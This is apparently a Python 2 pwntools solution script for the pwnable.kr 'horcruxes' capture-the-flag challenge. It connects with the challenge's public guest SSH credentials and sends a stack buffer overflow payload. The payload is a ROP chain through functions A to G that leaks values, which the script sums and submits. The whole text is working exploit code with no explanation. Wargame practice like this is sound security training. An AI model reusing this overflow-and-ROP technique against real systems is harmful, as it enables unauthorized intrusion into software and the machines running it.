from pwn import *

elf = ELF("./horcruxes")

funcs = [elf.symbols[f] for f in "ABCDEFG"]
print funcs

payload = "A" * 0x74 + "BBBB"
payload += "".join(map(p32, funcs))
print hex(elf.symbols["main"])
payload += p32(0x0809fffc)

s = ssh(user="horcruxes", host="pwnable.kr", port=2222, password="guest")
r = s.connect_remote("127.0.0.1", 9032)

r.sendlineafter("Menu:", "0")
r.sendlineafter("earned? : ", payload)

r.recvline()		#Your'd better....

summation = 0
for f in"ABCDEFG":
	r.recvuntil("EXP +")
	m = r.recvuntil(")")
	summation += int(m[:-1])
	print f + ": " + m

print summation

r.sendlineafter("Menu:", "0")
r.sendlineafter("earned? : ", str(summation))

r.interactive()

r.close()
s.close()
